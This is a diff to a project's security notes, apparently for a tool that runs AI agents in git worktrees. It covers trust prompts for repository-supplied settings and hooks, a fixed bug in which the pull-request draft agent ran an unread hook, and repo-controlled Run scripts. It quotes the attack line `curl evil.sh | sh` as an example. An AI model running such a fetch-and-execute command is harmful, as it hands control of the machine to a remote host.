@@ -28,9 +28,12 @@ service of its own — so most of the usual surface does not exist. What does:
   `curl evil.sh | sh` names no file to resolve — so the directory is read whole
   and to the bottom instead, which is a narrower promise the code can keep. A
   link out of the worktree is neither followed nor dropped: where it leads is
-  shown and digested, so retargeting it asks again. A way to get settings or a
-  hook honoured without that prompt is the most serious bug this project can
-  have.
+  shown and digested, so retargeting it asks again. That holds for every agent
+  run in a worktree, the pull-request draft included: the SDK loads every
+  source when it is not told otherwise, and the draft once asked without
+  saying, so a hook nobody had read ran when somebody asked for a description.
+  A way to get settings or a hook honoured without that prompt is the most
+  serious bug this project can have.
 - **A repository can supply the shell the Run button executes.** A checkout
   carrying `.octopus/scripts/` decides what runs, ahead of anything configured
   in the app — so a `git pull` can change it.
